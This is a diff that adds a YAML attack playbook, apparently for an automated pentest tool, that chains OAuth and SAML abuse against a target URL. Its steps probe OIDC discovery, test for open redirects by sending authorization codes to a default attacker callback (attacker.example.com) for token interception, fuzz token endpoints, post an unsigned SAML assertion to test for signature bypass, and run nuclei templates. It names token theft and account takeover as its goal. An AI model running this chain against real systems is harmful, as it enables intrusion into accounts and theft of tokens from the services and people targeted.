@@ -1,0 +1,81 @@
+name: "OAuth & SAML Abuse Chain"
+description: "Map OAuth/SAML endpoints, hunt for misconfigurations (open redirects, weak client secrets, token leakage), and attempt authorization code/token abuse."
+category: web
+attack_vector: "OAuth misconfiguration → token theft → account takeover"
+variables:
+  url:
+    required: true
+    description: "Target app URL (e.g. http://host)"
+  callback:
+    required: false
+    default: "http://attacker.example.com/callback"
+    description: "Attacker callback URL for token interception"
+cutting_edge: true
+references: ["OWASP OAuth Security Cheat Sheet", "SAML Attacks (XML Signature Wrapping)"]
+
+steps:
+  - name: "wellknown_discovery"
+    tool: "curl_request"
+    description: "Fetch OAuth/OIDC discovery documents"
+    args:
+      url: "{{url}}/.well-known/openid-configuration"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: "authorization_endpoint|token_endpoint|jwks_uri"
+    timeout: 120
+    gate: true
+    retries: 1
+    extracts:
+      - var: "auth_endpoint"
+        regex: "\"authorization_endpoint\"\\s*:\\s*\"([^\"]+)\""
+
+  - name: "open_redirect_test"
+    tool: "curl_request"
+    description: "Test for open redirect in OAuth flow (redirect_uri / state params)"
+    args:
+      url: "{{url}}/authorize?response_type=code&client_id=test&redirect_uri={{callback}}"
+      method: "GET"
+      follow_redirects: false
+      insecure: true
+    expected_output: "302|Location|callback"
+    timeout: 120
+    gate: false
+    retries: 1
+
+  - name: "token_endpoint_enum"
+    tool: "ffuf_fuzz"
+    description: "Enumerate token endpoints and OAuth-related paths"
+    args:
+      url: "{{url}}/FUZZ"
+      wordlist: "/usr/share/seclists/Discovery/Web-Content/oauth.txt"
+    expected_output: "Status: 200|Status: 405|token"
+    timeout: 300
+    gate: false
+    retries: 1
+
+  - name: "saml_signature_probe"
+    tool: "curl_request"
+    description: "Probe SAML endpoints with an unsigned/signature-stripped assertion to detect signature verification bypass"
+    args:
+      url: "{{url}}/saml/SSO"
+      method: "POST"
+      headers: 'Content-Type: application/x-www-form-urlencoded'
+      data: "SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIj8+PHNhbWwycDpSZXNwb25zZT48L3NhbWwycDpSZXNwb25zZT4="
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 120
+    gate: false
+    retries: 0
+
+  - name: "nuclei_oauth_scan"
+    tool: "nuclei_scan"
+    description: "Run nuclei OAuth/SAML misconfiguration templates"
+    args:
+      target: "{{url}}"
+      templates: "http/misconfiguration/oauth"
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 0
